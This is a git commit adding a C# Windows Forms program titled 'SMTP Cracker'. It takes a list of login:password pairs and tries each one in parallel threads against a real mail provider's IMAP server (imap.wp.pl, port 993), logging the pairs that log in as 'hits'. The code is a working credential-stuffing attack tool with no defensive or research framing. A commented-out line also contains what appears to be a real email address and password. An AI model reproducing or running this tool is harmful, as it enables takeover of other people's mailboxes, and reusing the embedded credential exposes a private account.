a2328392872600d999db9c25317e1a46839ce497
Her Mes <hermi1312@protonmail.com>
2022-01-04 17:32:40 +0100

    Add project files.

---
+++ SMTP_Credentials_Cracker/Form1.Designer.cs
@@ -0,0 +1,321 @@
+﻿
+namespace SMTP_Credentials_Cracker
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///  Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///  Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        ///  Required method for Designer support - do not modify
+        ///  the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.label1 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.textBoxHost = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.textBoxPort = new System.Windows.Forms.TextBox();
+            this.label4 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.textBoxThreads = new System.Windows.Forms.TextBox();
+            this.label5 = new System.Windows.Forms.Label();
+            this.progressBar1 = new System.Windows.Forms.ProgressBar();
+            this.progressLabel = new System.Windows.Forms.Label();
+            this.textBoxWorkingThreads = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBoxFailed = new System.Windows.Forms.TextBox();
+            this.label6 = new System.Windows.Forms.Label();
+            this.textBoxSuccess = new System.Windows.Forms.TextBox();
+            this.label7 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.label1.Location = new System.Drawing.Point(12, 11);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(81, 13);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Wordlist path:";
+            // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(230)))), ((int)(((byte)(233)))));
+            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.textBox1.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.textBox1.Location = new System.Drawing.Point(12, 27);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(395, 18);
+            this.textBox1.TabIndex = 2;
+            this.textBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(214)))), ((int)(((byte)(48)))), ((int)(((byte)(49)))));
+            this.button2.FlatAppearance.BorderSize = 0;
+            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button2.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.button2.ForeColor = System.Drawing.Color.White;
+            this.button2.Location = new System.Drawing.Point(413, 27);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 25);
+            this.button2.TabIndex = 3;
+            this.button2.Text = "Browse...";
+            this.button2.TextAlign = System.Drawing.ContentAlignment.TopCenter;
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // textBoxHost
+            // 
+            this.textBoxHost.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(230)))), ((int)(((byte)(233)))));
+            this.textBoxHost.Enabled = false;
+            this.textBoxHost.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.textBoxHost.Location = new System.Drawing.Point(12, 94);
+            this.textBoxHost.Name = "textBoxHost";
+            this.textBoxHost.Size = new System.Drawing.Size(338, 25);
+            this.textBoxHost.TabIndex = 7;
+            this.textBoxHost.Text = "imap.wp.pl";
+            this.textBoxHost.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.label3.Location = new System.Drawing.Point(12, 78);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(34, 13);
+            this.label3.TabIndex = 6;
+            this.label3.Text = "Host:";
+            // 
+            // textBoxPort
+            // 
+            this.textBoxPort.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(230)))), ((int)(((byte)(233)))));
+            this.textBoxPort.Enabled = false;
+            this.textBoxPort.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.textBoxPort.Location = new System.Drawing.Point(365, 94);
+            this.textBoxPort.Name = "textBoxPort";
+            this.textBoxPort.Size = new System.Drawing.Size(122, 25);
+            this.textBoxPort.TabIndex = 9;
+            this.textBoxPort.Text = "993";
+            this.textBoxPort.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.label4.Location = new System.Drawing.Point(365, 78);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(31, 13);
+            this.label4.TabIndex = 8;
+            this.label4.Text = "Port:";
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(214)))), ((int)(((byte)(48)))), ((int)(((byte)(49)))));
+            this.button1.FlatAppearance.BorderSize = 0;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.button1.ForeColor = System.Drawing.Color.White;
+            this.button1.Location = new System.Drawing.Point(12, 273);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(475, 59);
+            this.button1.TabIndex = 11;
+            this.button1.Text = "START CRACKING";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click_1);
+            // 
+            // textBoxThreads
+            // 
+            this.textBoxThreads.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(230)))), ((int)(((byte)(233)))));
+            this.textBoxThreads.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.textBoxThreads.Location = new System.Drawing.Point(12, 165);
+            this.textBoxThreads.Name = "textBoxThreads";
+            this.textBoxThreads.Size = new System.Drawing.Size(72, 25);
+            this.textBoxThreads.TabIndex = 14;
+            this.textBoxThreads.Text = "20";
+            this.textBoxThreads.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.label5.Location = new System.Drawing.Point(12, 149);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(72, 13);
+            this.label5.TabIndex = 13;
+            this.label5.Text = "Threads No.:";
+            // 
+            // progressBar1
+            // 
+            this.progressBar1.Location = new System.Drawing.Point(12, 231);
+            this.progressBar1.Name = "progressBar1";
+            this.progressBar1.Size = new System.Drawing.Size(475, 27);
+            this.progressBar1.TabIndex = 15;
+            // 
+            // progressLabel
+            // 
+            this.progressLabel.AutoSize = true;
+            this.progressLabel.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.progressLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.progressLabel.Location = new System.Drawing.Point(12, 215);
+            this.progressLabel.Name = "progressLabel";
+            this.progressLabel.Size = new System.Drawing.Size(83, 13);
+            this.progressLabel.TabIndex = 16;
+            this.progressLabel.Text = "Progress 0 of 0";
+            // 
+            // textBoxWorkingThreads
+            // 
+            this.textBoxWorkingThreads.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(42)))), ((int)(((byte)(44)))));
+            this.textBoxWorkingThreads.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.textBoxWorkingThreads.Enabled = false;
+            this.textBoxWorkingThreads.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.textBoxWorkingThreads.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.textBoxWorkingThreads.Location = new System.Drawing.Point(106, 165);
+            this.textBoxWorkingThreads.Name = "textBoxWorkingThreads";
+            this.textBoxWorkingThreads.Size = new System.Drawing.Size(97, 25);
+            this.textBoxWorkingThreads.TabIndex = 18;
+            this.textBoxWorkingThreads.Text = "0";
+            this.textBoxWorkingThreads.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.label2.Location = new System.Drawing.Point(106, 149);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(97, 13);
+            this.label2.TabIndex = 17;
+            this.label2.Text = "Working threads:";
+            // 
+            // textBoxFailed
+            // 
+            this.textBoxFailed.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(42)))), ((int)(((byte)(44)))));
+            this.textBoxFailed.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.textBoxFailed.Enabled = false;
+            this.textBoxFailed.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.textBoxFailed.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.textBoxFailed.Location = new System.Drawing.Point(229, 165);
+            this.textBoxFailed.Name = "textBoxFailed";
+            this.textBoxFailed.Size = new System.Drawing.Size(121, 25);
+            this.textBoxFailed.TabIndex = 20;
+            this.textBoxFailed.Text = "0";
+            this.textBoxFailed.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.label6.Location = new System.Drawing.Point(229, 149);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(41, 13);
+            this.label6.TabIndex = 19;
+            this.label6.Text = "Failed:";
+            // 
+            // textBoxSuccess
+            // 
+            this.textBoxSuccess.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(42)))), ((int)(((byte)(44)))));
+            this.textBoxSuccess.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.textBoxSuccess.Enabled = false;
+            this.textBoxSuccess.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.textBoxSuccess.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.textBoxSuccess.Location = new System.Drawing.Point(365, 165);
+            this.textBoxSuccess.Name = "textBoxSuccess";
+            this.textBoxSuccess.Size = new System.Drawing.Size(121, 25);
+            this.textBoxSuccess.TabIndex = 22;
+            this.textBoxSuccess.Text = "0";
+            this.textBoxSuccess.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label7
+            // 
+            this.label7.AutoSize = true;
+            this.label7.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
+            this.label7.Location = new System.Drawing.Point(365, 149);
+            this.label7.Name = "label7";
+            this.label7.Size = new System.Drawing.Size(49, 13);
+            this.label7.TabIndex = 21;
+            this.label7.Text = "Success:";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(52)))), ((int)(((byte)(54)))));
+            this.ClientSize = new System.Drawing.Size(499, 346);
+            this.Controls.Add(this.textBoxSuccess);
+            this.Controls.Add(this.label7);
+            this.Controls.Add(this.textBoxFailed);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.textBoxWorkingThreads);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.progressLabel);
+            this.Controls.Add(this.progressBar1);
+            this.Controls.Add(this.textBoxThreads);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.textBoxPort);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.textBoxHost);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "[SMTP Cracker] v0.1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.TextBox textBoxHost;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox textBoxPort;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TextBox textBoxThreads;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.ProgressBar progressBar1;
+        private System.Windows.Forms.Label progressLabel;
+        private System.Windows.Forms.TextBox textBoxWorkingThreads;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBoxFailed;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.TextBox textBoxSuccess;
+        private System.Windows.Forms.Label label7;
+    }
+}
+
---
+++ SMTP_Credentials_Cracker/Form1.cs
@@ -0,0 +1,171 @@
+﻿using MailKit.Net.Imap;
+using MailKit.Net.Smtp;
+using MailKit.Security;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace SMTP_Credentials_Cracker
+{
+    public partial class Form1 : Form
+    {
+        private List<string> mHits = new List<string>();
+        private string mWordlistPath, mHost;
+        private int mThreadCounter = 0, mPort,  mCurrentLine = 0, mFailedCounter = 0, mHitsCounter = 0;
+        private long mLinesCount;
+
+        public Form1()
+        {
+            InitializeComponent(); 
+            textBox1.AutoSize = false;
+            textBox1.Size = new Size(395, 25);
+        }
+
+        public static bool TryAuthenticate(string login, string password, string server, int port)
+        {
+            try
+            {
+                var smtp = new ImapClient();
+                smtp.Timeout = 250;
+                smtp.Connect(server, port, SecureSocketOptions.SslOnConnect);
+                smtp.Authenticate(login, password);
+                bool result = smtp.IsAuthenticated;
+                smtp.Disconnect(true);
+                return result;
+            }
+
+            catch(Exception timeoutException)
+            {
+                return false;
+            }
+
+        }
+        
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //TryAuthenticate2("milosz.skiba@wp.pl", "@Kaisal1312@", "smtp.wp.pl", 465);
+            //bool b = TryAuthenticate("milosz.skiba@wp.pl", "@Kaisal1312@", "imap.wp.pl", 993);
+            
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            mHost = textBoxHost.Text;
+            mPort = Convert.ToInt32(textBoxPort.Text);
+            int maxThreads = Convert.ToInt32(textBoxThreads.Text);
+
+            new Thread(() => ProgressWatcher()).Start();
+
+            
+            ThreadPool.SetMaxThreads(maxThreads, maxThreads);
+
+            using (StreamReader reader = new StreamReader(mWordlistPath))
+            {
+                string line;
+
+                while ((line = reader.ReadLine()) != null)
+                {
+                    ThreadPool.QueueUserWorkItem(new WaitCallback(ProcessLine), line.Split(':'));
+                    Thread.Sleep(100);
+                }
+            }
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void ProcessLine(object line)
+        {
+            string[] _line = (string[])line;
+
+            if (TryAuthenticate(_line[0], _line[1], mHost, mPort))
+            {
+                mHits.Add($"{_line[0]}:{_line[1]}");
+                mHitsCounter++;
+            }
+            else
+                mFailedCounter++;
+
+            mCurrentLine++;
+        }
+
+        private void ProgressWatcher()
+        {
+            while(mCurrentLine < mLinesCount)
+            {
+                //Thread thisThread = Thread.CurrentThread;
+
+                progressLabel.Invoke((MethodInvoker) delegate {
+                    progressLabel.Text = $"Progress {mCurrentLine} of {mLinesCount}";
+                });
+
+                textBoxWorkingThreads.Invoke((MethodInvoker)delegate {
+                    textBoxWorkingThreads.Text = ThreadPool.ThreadCount.ToString();
+                });
+
+                progressBar1.Invoke((MethodInvoker)delegate {
+                    progressBar1.Value++;
+                });
+
+                textBoxSuccess.Invoke((MethodInvoker)delegate {
+                    textBoxSuccess.Text = mHitsCounter.ToString();
+                });
+                
+                textBoxSuccess.Invoke((MethodInvoker)delegate {
+                    textBoxFailed.Text = mFailedCounter.ToString();
+                });
+
+                Thread.Sleep(100);
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog openFileDialog = new OpenFileDialog();
+            openFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
+
+            if (openFileDialog.ShowDialog() == DialogResult.OK)
+            {
+                mWordlistPath = openFileDialog.FileName;
+                textBox1.Text = mWordlistPath;
+                mLinesCount = CountLines();
+                progressLabel.Text = $"Progress {mCurrentLine} of {mLinesCount}";
+                progressBar1.Maximum = (int)mLinesCount;
+            }
+        }
+
+        private long CountLines()
+        {
+            FileStream fs = new FileStream(mWordlistPath, FileMode.Open, FileAccess.Read, FileShare.None, 1024 * 1024);
+
+            long lineCount = 0;
+            byte[] buffer = new byte[1024 * 1024];
+            int bytesRead;
+
+            do
+            {
+                bytesRead = fs.Read(buffer, 0, buffer.Length);
+                for (int i = 0; i < bytesRead; i++)
+                    if (buffer[i] == '\n')
+                        lineCount++;
+            }
+            while (bytesRead > 0);
+
+            fs.Close();
+
+            return lineCount;
+        }
+    }
+}
